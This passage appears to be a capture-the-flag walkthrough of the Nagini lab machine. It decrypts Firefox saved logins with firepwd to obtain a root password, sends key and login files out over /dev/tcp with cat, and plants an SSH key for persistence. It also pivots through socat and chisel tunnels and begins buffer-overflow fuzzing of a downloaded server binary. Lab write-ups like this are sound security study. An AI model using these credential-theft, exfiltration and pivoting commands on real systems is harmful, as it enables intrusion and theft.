ClientAuthRememberList.txt    bookmarkbackups		content-prefs.sqlite   extensions		  gmp-gmpopenh264     minidumps	  protections.sqlite	 sessionstore.jsonlz4		     weave
SecurityPreloadState.txt      broadcast-listeners.json	cookies.sqlite	      extensions.json		  handlers.json       permissions.sqlite  saved-telemetry-pings  shield-preference-experiments.json  webappsstore.sqlite
SiteSecurityServiceState.txt  cert9.db			crashes		      favicons.sqlite		  key4.db	      pkcs11.txt	  search.json.mozlz4	 shield-recipe-client.json	     xulstore.json
addonStartup.json.lz4	     cert_override.txt		datareporting	      features			  lock		      places.sqlite	  security_state	 storage
addons.json		     compatibility.ini		enumerate_devices.txt  formhistory.sqlite	  logins-backup.json  pluginreg.dat	  serviceworker.txt	 storage.sqlite
hermoine@Nagini:~/.mozilla/firefox/g2mhbq0o.default$ cat logins.json 
{"nextId":5,"logins":[{"id":4,"hostname":"http://nagini.hogwarts","httpRealm":null,"formSubmitURL":"","usernameField":"","passwordField":"","encryptedUsername":"MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECNjdCM6xwGZvBAia4NxciV72TQ==","encryptedPassword":"MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECAGAbZHd/uQkBBD9Ftg4gxw85Lco5YQ8g1wt","guid":"{b89776a4-7e8f-472d-9bcf-b06ec071912f}","encType":1,"timeCreated":1617516357729,"timeLastUsed":1617516357729,"timePasswordChanged":1617516357729,"timesUsed":1}],"version":3,"potentiallyVulnerablePasswords":[],"dismissedBreachAlertsByLoginGUID":{}}hermoine@Nagini:~/.mozilla/firefox/g2mhbq0o.default$ 
```
and seems to be encrypted so one tool that we can use to decrypt them is called de firepwd or firefoxdecript 

to visualize them we have to bring it to our personal desktop using socat + python3 because from my personal desktop we can not reach 10.10.0.137 we are reaching because of the proxychains + chisel so 

first of all let's install firepwd to decrypt that password

```bash
❯ git clone https://github.com/lclevy/firepwd
Clonando en 'firepwd'...
remote: Enumerating objects: 88, done.
remote: Counting objects: 100% (8/8), done.
remote: Compressing objects: 100% (8/8), done.
remote: Total 88 (delta 2), reused 3 (delta 0), pack-reused 80
Recibiendo objetos: 100% (88/88), 239.08 KiB | 724.00 KiB/s, listo.
Resolviendo deltas: 100% (41/41), listo.
```
if you have this problem 

```
❯ ls
 mozilla_db   firepwd.py   LICENSE   mozilla_pbe.pdf   mozilla_pbe.svg   readme.md   requirements.txt
❯ python3 firepwd.py
Traceback (most recent call last):
  File "/home/z3kk3n/Desktop/vulnHUB/targetMachine/content/firepwd/firepwd.py", line 28, in <module>
    from Crypto.Cipher import DES3, AES
ModuleNotFoundError: No module named 'Crypto'
```
this is a way to fix it 
```
with this command you  create a virtual environment  
❯ python3 -m venv venv
here's a way of activate
❯ source venv/bin/activate
now the installation 

❯ pip3 install -r requirements.txt
Collecting PyCryptodome>=3.9.0
  Downloading pycryptodome-3.17-cp35-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.1 MB)
     |████████████████████████████████| 2.1 MB 1.3 MB/s 
Collecting pyasn1>=0.4.8
  Downloading pyasn1-0.5.0-py2.py3-none-any.whl (83 kB)
     |████████████████████████████████| 83 kB 2.3 MB/s 
Installing collected packages: PyCryptodome, pyasn1
Successfully installed PyCryptodome-3.17 pyasn1-0.5.0
```
usage 
if we try to execute it 

```bash 
❯ python3 firepwd.py
cannot find key4.db or key3.db
```
they ask us for a key4.db or key3.db to 

and actually we have them let's bring it 


how we can not reach our ip we have to work using socat from the intermediary node so from 10.10.0.136 in our case 

```bash
./socat TCP-LISTEN:4848,fork TCP:192.168.100.53:692 
```
where ```TCP-LISTEN``` stay listening all the traffic coming from 4848```,fork``` and fork it ```TCP:192.168.100.53:692``` now send them to 192.168.100.53:692

now how we don't have python or nc we have to use cat to tranfer data

```bash
hermoine@Nagini:~/.mozilla/firefox/g2mhbq0o.default$ cat < key4.db > /dev/tcp/10.10.0.136/692
```
where ```cat``` visulize the output ```< key4.db > ``` from key.db and send to ``` /dev/tcp/10.10.0.692``` the node 10.10.0.136 on port 692
we have to do the same thing with the another archive 

 ``` cat < logins.json  > /dev/tcp/10.10.0.136/4848```
 

let's crack them using the tool that we fixed and installed 

```bash
ython3 firepwd.py key4.db logins.json
globalSalt: b'db8e223cef34f55b9458f52286120b8fb5293c95'
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.12.5.1.3 pbeWithSha1AndTripleDES-CBC
     SEQUENCE {
       OCTETSTRING b'0bce4aaf96a7014248b28512e528c9e9a75c30f2'
       INTEGER b'01'
     }
   }
   OCTETSTRING b'2065c62fe9dc4d8352677299cc0f2cb8'
 }
entrySalt: b'0bce4aaf96a7014248b28512e528c9e9a75c30f2'
b'70617373776f72642d636865636b0202'
password check? True
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.12.5.1.3 pbeWithSha1AndTripleDES-CBC
     SEQUENCE {
       OCTETSTRING b'11c73a5fe855de5d96e9a06a8503019d00efa9e4'
       INTEGER b'01'
     }
   }
   OCTETSTRING b'ceedd70a1cfd8295250bcfed5ff49b6c878276b968230619a2c6c51aa4ea5c8e'
 }
entrySalt: b'11c73a5fe855de5d96e9a06a8503019d00efa9e4'
b'233bb64646075d9dfe8c464f94f4df235234d94f4c2334940808080808080808'
decrypting login/password pairs
http://nagini.hogwarts:b'root',b'@Alohomora#123'
```
seems that we have potentials credentias let's try them for root 
```bash
hermoine@Nagini:~/.mozilla/firefox/g2mhbq0o.default$ su root
Password: 
root@Nagini:/home/hermoine/.mozilla/firefox/g2mhbq0o.default# whoami
root
root@Nagini:/home/hermoine/.mozilla/firefox/g2mhbq0o.default# 
```

flag 
```php
root@Nagini:/home/hermoine/.mozilla/firefox/g2mhbq0o.default# cd /root/
root@Nagini:~# ls
horcrux3.txt
root@Nagini:~# cat horcrux3.txt 
  ____                            _         _       _   _                 
 / ___|___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_(_) ___  _ __  ___ 
| |   / _ \| '_ \ / _` | '__/ _` | __| | | | |/ _` | __| |/ _ \| '_ \/ __|
| |__| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | \__ \
 \____\___/|_| |_|\__, |_|  \__,_|\__|\__,_|_|\__,_|\__|_|\___/|_| |_|___/
                  |___/                                                   


Machine Author: Mansoor R (@time4ster)
Machine Difficulty: Medium
Machine Name: Nagini
Horcruxes Hidden in this VM: 3 horcruxes

You have successfully pwned Nagini machine.
Here is your third hocrux: horcrux_{NTogRGlhZGVtIG9mIFJhdmVuY2xhdyBkZXN0cm95ZWQgYnkgSGFycnk=}




# For any queries/suggestions feel free to ping me at email: time4ster@protonmail.com

root@Nagini:~# 
```
# Reconnaissance 192.168.100.?

now let's find another machines because if we are able to watch another interface it's because theres other machines in to this environment.

```bash
root@Nagini:~# hostname -I
192.168.100.129 10.10.0.137 
```


## Enumeration | Pivoting 192.168.100.?

-using my tool [HostDiscovery](https://zeekk3n.github.io/andrey.github.io/project-host-discovery/#) we will search for more IP/interfaces

first of all we need to verify which interfaces we are able to enumerate.

```bash
root@Nagini:/dev/shm# nano host.sh 
root@Nagini:/dev/shm# ./host.sh 
[+] host 192.168.100.1 - is ACTIVE
[+] host 192.168.100.130 - is ACTIVE
[+] host 192.168.100.129 - is ACTIVE
root@Nagini:/dev/shm# 
```
it looks like we can enumerate host 192.168.100.130, let's use my tool in order to find open ports  [PortScanner](https://zeekk3n.github.io/andrey.github.io/project-portscanner/#)


```bash
root@Nagini:/dev/shm# ./Portscanner.sh 
[+] Port 21 - is OPEN
[+] Port 22 - is OPEN
[+] Port 80 - is OPEN
[+] Port 2222 - is OPEN
[+] Port 9898 - is OPEN
^C

[!] getting out that here...

root@Nagini:/dev/shm# 
```
h



how we know the ip for the machine that we can reach, now we have to enumerate to figure out what kind of machine is based on the TTL which is time to life.
```bash
root@Nagini:/dev/shm# ping -c3 192.168.100.30

output:
```php
PING 192.168.100.30 (192.168.100.30) 56(84) bytes of data.
^C
--- 192.168.100.30 ping statistics ---
3 packets transmitted, 0 received, 100% packet loss, time 56ms

root@Nagini:/dev/shm# ping -c 3 192.168.100.130
PING 192.168.100.130 (192.168.100.130) 56(84) bytes of data.
64 bytes from 192.168.100.130: icmp_seq=1 ttl=64 time=0.471 ms
64 bytes from 192.168.100.130: icmp_seq=2 ttl=64 time=0.346 ms
64 bytes from 192.168.100.130: icmp_seq=3 ttl=64 time=0.474 ms

--- 192.168.100.130 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 57ms
rtt min/avg/max/mdev = 0.346/0.430/0.474/0.062 ms
```


- ```-TTL-``` : means the time to life of the machine, if it's 64 the machine is Linux, or if it's 124 the machine will be windows.
- ```--3 packets transmitted, 3 received``` : with this output means that the machine is active.

SSH keys
how we found another machine that we are able to do pivoting let's make persistance with ssh keys in case if we need to bring back again to hagridMachine


we have to check the id rsa pub 
```bash
cat ~/.ssh/id_rsa.pub
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: /root/.ssh/id_rsa.pub
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCx3N+ZKQLTQIgqGkcpWZcxbt6j4/qTj4dmyyDtu6w7zyMVKsAFqJj6EGEqWYd8tysgM3O7ds7EAnRAwey1w6oEpQ0YmzVvWE1Ose/FuxSu8UVTZ8Kq/dwzIuANcrNYpS6TAvx0VsCnsdNUNLqhcCXWu3cX/7ocUUczHaO/z/Q2Nql4AUL1isOg/4Y/NpVaQG26y4tmB55
       │ COIVXBnikNltrxTeym2/9WtHhB2ev0UuJZstU7eFXwqfD15SBv31IezQGY6MaXUSdEjORWVb6vDZLcstK22IqrLGCuyn0GquKCdg8JWx8mxQYGrxz9jF2RGm/tsiVi+9rXaFDVQhx2hhRK000OWhD8YtbEGXTi5jYJgzSXSjMuz4u62bk+lVgXS1S2Fnauz4f1vGFJHacxUPQY9q0Yswe4n6t0soNDB3Dm6SDebRDXLF6x0
       │ I50SzsBWDdmcbEM1wHZ0xOfDO2L/M2ILOCnWqg0WNkS5nQ5IDeXqoFqcZVFsP+RmNht3uAjgU= root@parrot
```

in order to copy + paste and remove the spaces between each line

```bash
❯ cat ~/.ssh/id_rsa.pub | tr -d '\n' | xclip -sel clip
```
now we have to paste it in /root/.ssh on (hagrid98) machine 

```bash
root@Nagini cd /root/.ssh/
root@Nagini ls
root@Nagini nano authorized_keys
```
paste it 
and let's verify if it works
from our machine let's use ssh
```bash
❯ ssh root@10.10.0.137
Linux Aragog 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@Nagini:
```
# Prework of PIVOTING 192.168.100.130
how we figure out a new interface with a new ip with open ports we will try to enumerate them 

first of all is not anymore a strick chain from the proxyconfig so we have to edit it 

we have to change it to Dynamic chain 

go to vim 

```bash 
/etc/proxychains.conf 
````
now have to set 
the new connection the way that we set them,It's like stacking books one on top of the other, the new would ride on top of the old.
```
  66   │ socks5 127.0.0.1 8888 
  67   │ socks5 127.0.0.1 1080
```
and comment # the strick chain and descomment the Dynamic chain 
```
  10   │ dynamic_chain
  11   │ #
  12   │ # Dynamic - Each connection will be done via chained proxies
  13   │ # all proxies chained in the order as they appear in the list
  14   │ # at least one proxy must be online to play in chain
  15   │ # (dead proxies are skipped)
  16   │ # otherwise EINTR is returned to the app
  17   │ #
  18   │ #strict_chain
  19   │ #
```

now you have to play with tunnels in order to set the conection successfully 
for that you need to 
transfer chisel to nagini machine because it will work as intermediary

```bash
❯ proxychains scp  chisel_1.8.1_linux_amd64 root@10.10.0.137:/dev/shm/chisel
ProxyChains-3.1 (http://proxychains.sf.net)
|D-chain|-<>-127.0.0.1:8888-<--timeout
|D-chain|-<>-127.0.0.1:1080-<><>-10.10.0.137:22-<><>-OK
chisel_1.8.1_linux_amd64                                                                                                                                                                                              100% 8188KB  18.8MB/s   00:00    
```

no we have to execute chisel in aragog machine in order to stay listening to the output of 10.10.137 (nagini) and send it to our personal desktop this way works with input and output

```bash
root@Aragog:/dev/shm# ./socat TCP-LISTEN:6666,fork TCP:192.168.100.53:1234 
```


and now from nagini all the output that comes from 192.168.100.130 we have to redirect to the tunnel that we made 

```bash 
^Croot@Nagini:/dev/shm# ./chisel client 10.10.0.136:6666 R:8888:socks
```
let's enumerate 192.168.100.130 from pur personal destop in order to verify if all these works 
```bash
❯ proxychains nmap -sT -Pn --top-ports 500 -open -T5 -v -n 192.168.100.130 2>/dev/null | grep  -vE "timeout"
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 00:59 CST
Initiating Connect Scan at 00:59
Scanning 192.168.100.130 [500 ports]
Discovered open port 21/tcp on 192.168.100.130
Discovered open port 22/tcp on 192.168.100.130
Discovered open port 80/tcp on 192.168.100.130
Connect Scan Timing: About 45.60% done; ETC: 01:00 (0:00:37 remaining)
Discovered open port 2222/tcp on 192.168.100.130
Completed Connect Scan at 01:00, 66.03s elapsed (500 total ports)
Nmap scan report for 192.168.100.130
Host is up (0.13s latency).
Not shown: 496 closed tcp ports (conn-refused)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
2222/tcp open  EtherNetIP-1

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 66.07 seconds
```
it  works xD agradecido con el de arriba

to visualize port 80 we hae to use foxyproxy 
go to options > add > name > fawkes > proxyType > SOCKS5 > proxy Ip > 127.0.0.1 > PORT > in our case will 8888 because of this ```2023/05/02 12:55:17 server: session#2: tun: proxy#R:127.0.0.1:8888=>socks: Listening ```

now we are able to watch the port 80, nevertheless we are not able find anything seems that is a page with an image just like that

and i am able to use FTP because of por 21 is open 

so let's enumerate it 
prxychains + ftp + ip will be 

```bash
 proxychains ftp 192.168.100.130
```

output

```
ProxyChains-3.1 (http://proxychains.sf.net)
|D-chain|-<>-127.0.0.1:8888-<>-127.0.0.1:1080-<--timeout
|D-chain|-<>-127.0.0.1:8888-<><>-192.168.100.130:21-<><>-OK
Connected to 192.168.100.130.
220 (vsFTPd 3.0.3)
Name (192.168.100.130:z3kk3n):
```

you have to specify the user anonymous because is the invite user you don't have to use credentials to this user just press enter if ftp ask you for password
```bash
Name (192.168.100.130:z3kk3n): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

now we have to list the sharing folders via ftp

```bash
ftp> dir
500 Illegal PORT command.
ftp: bind: Address already in use
ftp> help
```
this happens because we are using proxychains but if we set the passive mode we can use ftp service even though with proxychains 
```
ftp> help
Commands may be abbreviated.  Commands are:

!		dir		mdelete		qc		site
$		disconnect	mdir		sendport	size
account		exit		mget		put		status
append		form		mkdir		pwd		struct
ascii		get		mls		quit		system
bell		glob		mode		quote		sunique
binary		hash		modtime		recv		tenex
bye		help		mput		reget		tick
case		idle		newer		rstatus		trace
cd		image		nmap		rhelp		type
cdup		ipany		nlist		rename		user
chmod		ipv4		ntrans		reset		umask
close		ipv6		open		restart		verbose
cr		lcd		prompt		rmdir		?
delete		ls		passive		runique
debug		macdef		proxy		send
ftp> passive
Passive mode on.
ftp> dir
227 Entering Passive Mode (192,168,100,130,203,149).
|D-chain|-<>-127.0.0.1:8888-<><>-192.168.100.130:52117-<><>-OK
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0          705996 Apr 12  2021 server_hogwarts
```
to get the resources and analyze them using out tools we have to use get
ejm 
```
seems to be a binary so we have to use the binary mode as well
ftp> binary
200 Switching to Binary mode.

get + resource 

get server_hogwarts
local: server_hogwarts remote: server_hogwarts
227 Entering Passive Mode (192,168,100,130,198,92).
|D-chain|-<>-127.0.0.1:8888-<><>-192.168.100.130:50780-<><>-OK
150 Opening BINARY mode data connection for server_hogwarts (705996 bytes).
45
```

ctrl + c and let's check the binary 

# Precheck BufferOverFlow

seems that we have to dubug that app because of this 

```
❯ file server_hogwarts
server_hogwarts: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, BuildID[sha1]=1d09ce1a9929b282f26770218b8d247716869bd0, for GNU/Linux 3.2.0, not stripped
```

according with this output we can say that we have to fight againts of 32 bits binary 

strace tool

```bash 

❯ strace ./server_hogwarts
execve("./server_hogwarts", ["./server_hogwarts"], 0x7ffe3a1adc10 /* 34 vars */) = 0
[ Process PID=88833 runs in 32 bit mode. ]
brk(NULL)                               = 0x84b5000
brk(0x84b57c0)                          = 0x84b57c0
set_thread_area({entry_number=-1, base_addr=0x84b52c0, limit=0x0fffff, seg_32bit=1, contents=0, read_exec_only=0, limit_in_pages=1, seg_not_present=0, useable=1}) = 0 (entry_number=12)
uname({sysname="Linux", nodename="parrot", ...}) = 0
readlink("/proc/self/exe", "/home/z3kk3n/Desktop/vulnHUB/faw"..., 4096) = 59
brk(0x84d67c0)                          = 0x84d67c0
brk(0x84d7000)                          = 0x84d7000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No existe el fichero o el directorio)
socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
setsockopt(3, SOL_SOCKET, SO_REUSEPORT, [1], 4) = 0
bind(3, {sa_family=AF_INET, sin_port=htons(9898), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
listen(3, 3)                            = 0
accept(3, 
```
according with this output ```sin_port=htons(9898)``` when the service is open the app open a port 9898 let's verify 

if we execute the ```./server_hogwarts``` 
we will try to connect via port 9898,because  we saw that it opens on the strace output, 
lets check 


```bash
nc localhost 9898
```

and it connect us 

```bash 
❯ nc localhost 9898
Welcome to Hogwart's magic portal
Tell your spell and ELDER WAND will perform the magic

Here is list of some common spells:
1. Wingardium Leviosa
2. Lumos
3. Expelliarmus
4. Alohomora
5. Avada Kedavra 

Enter your spell: 

```

# BOF enumeration 
if we try to connnect in port 9898 of 192.168.100.130 using proxychains 

if it allow us we can enumerate the BOF in order to find if it's vulneral to bof 

let's check 

```proxychains nc 192.168.100.130 9898```

output

```bash
❯ proxychains nc 192.168.100.130 9898
ProxyChains-3.1 (http://proxychains.sf.net)
|D-chain|-<>-127.0.0.1:8888-<>-127.0.0.1:1080-<--timeout
|D-chain|-<>-127.0.0.1:8888-<><>-192.168.100.130:9898-<><>-OK
Welcome to Hogwart's magic portal
Tell your spell and ELDER WAND will perform the magic

Here is list of some common spells:
1. Wingardium Leviosa
2. Lumos
3. Expelliarmus
4. Alohomora
5. Avada Kedavra 

Enter your spell: 
```
it allow us 

so guessing that the programmer did not sanitized the program and checking that the options that we are able to use are a short size of bytes we can input AA in order to make a segmentation fault if it says while i am running the program it's because it has the vulnerability called BOF  

check seems thatit's vulneral at bof

My input
```bash
❯ nc localhost 9898
Welcome to Hogwart's magic portal
Tell your spell and ELDER WAND will perform the magic

Here is list of some common spells:
1. Wingardium Leviosa
2. Lumos
3. Expelliarmus
4. Alohomora
5. Avada Kedavra 

Enter your spell: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

```


output from the program
```bash 
❯ ./server_hogwarts
